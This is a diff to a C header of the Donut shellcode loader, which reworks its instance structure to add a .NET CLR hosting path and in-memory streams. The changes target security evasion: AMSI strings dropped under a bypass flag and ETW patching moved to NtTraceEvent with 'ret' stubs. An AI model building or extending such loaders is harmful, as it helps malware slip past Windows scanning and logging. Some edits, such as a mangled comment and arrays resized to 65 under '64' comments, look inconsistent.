@@ -219,7 +219,7 @@ typedef struct _API_IMPORT {
 } API_IMPORT, *PAPI_IMPORT;
 
 typedef struct _DONUT_CRYPT {
-    uint8_t  mk[DONUT_KEY_LEN];   // master key
+    uint8_t  mk[DONUT_KEY_LEN];   // master key_DONUT_MODULE
     uint8_t  ctr[DONUT_BLK_LEN];  // counter + nonce
 } DONUT_CRYPT, *PDONUT_CRYPT;
 
@@ -245,6 +245,7 @@ typedef struct _DONUT_MODULE {
     uint8_t  data[4];                         // data of EXE/DLL/JS/VBS file
 } DONUT_MODULE, *PDONUT_MODULE;
 
+
 // everything required for an instance goes into the following structure
 typedef struct _DONUT_INSTANCE {
     uint32_t    len;                          // total size of instance
@@ -253,8 +254,8 @@ typedef struct _DONUT_INSTANCE {
     uint64_t    iv;                           // the 64-bit initial value for maru hash
 
     union {
-      uint64_t  hash[64];                     // holds up to 64 api hashes
-      void     *addr[64];                     // holds up to 64 api addresses
+      uint64_t  hash[65];                     // holds up to 64 api hashes
+      void     *addr[65];                     // holds up to 64 api addresses
       // include prototypes only if header included from loader.h
       #ifdef LOADER_H
       struct {
@@ -314,7 +315,10 @@ typedef struct _DONUT_INSTANCE {
         // imports from mscoree.dll
         CorBindToRuntime_t               CorBindToRuntime;
         CLRCreateInstance_t              CLRCreateInstance;
-        
+
+        // imports from shlwapi.dll
+        SHCreateMemStream_t              SHCreateMemStream;
+
         // imports from ole32.dll
         CoInitializeEx_t                 CoInitializeEx;
         CoCreateInstance_t               CoCreateInstance;
@@ -352,8 +356,15 @@ typedef struct _DONUT_INSTANCE {
     
     char        dataname[8];                  // ".data"
     char        kernelbase[12];               // "kernelbase"
+
+ #ifndef BYPASS_AMSI_A
     char        amsi[8];                      // "amsi"
     char        clr[4];                       // "clr"
+  #endif
+
+    char        shlwapi[9];                   // shlwapi
+    char        shCreateStream[19];           // SHCreateMemStream
+  
     char        wldp[8];                      // "wldp"
     char        ntdll[8];                     // "ntdll"
     
@@ -364,14 +375,21 @@ typedef struct _DONUT_INSTANCE {
     int         headers;                      // indicates whether to overwrite PE headers
     char        wldpQuery[32];                // WldpQueryDynamicCodeTrust
     char        wldpIsApproved[32];           // WldpIsClassInApprovedList
+
+ #ifndef BYPASS_AMSI_A
     char        amsiInit[16];                 // AmsiInitialize
     char        amsiScanBuf[16];              // AmsiScanBuffer
     char        amsiScanStr[16];              // AmsiScanString
-    char        etwEventWrite[16];            // EtwEventWrite
-    char        etwEventUnregister[20];       // EtwEventUnregister
+#endif
+
+    //char        etwEventWrite[16];          // EtwEventWrite
+    char        ntraceEvent[14];              // NtTraceEvent
+    //char        etwEventUnregister[20];     // EtwEventUnregister
     char        etwRet64[1];                  // "ret" instruction for Etw
     char        etwRet32[4];                  // "ret 14h" instruction for Etw
     
+    char        get_clr[23];
+
     char        wscript[8];                   // WScript
     char        wscript_exe[12];              // wscript.exe
 
@@ -379,7 +397,17 @@ typedef struct _DONUT_INSTANCE {
 
     GUID        xIID_IUnknown;
     GUID        xIID_IDispatch;
-    
+
+    // GUID to define own version Loader .NET
+    GUID        xCLSID_ICLRRuntimeHost;
+    GUID        xIID_ICLRRuntimeHost;
+    GUID        xIID_ICLRAssemblyIdentityManager;
+
+    GUID        xIID_IHostControl;
+    GUID        xIID_IHostAssemblyManager;
+    GUID        xIID_IHostAssemblyStore;
+    GUID        xIID_IHostMemoryManager;
+
     // GUID required to load .NET assemblies
     GUID        xCLSID_CLRMetaHost;
     GUID        xIID_ICLRMetaHost;  
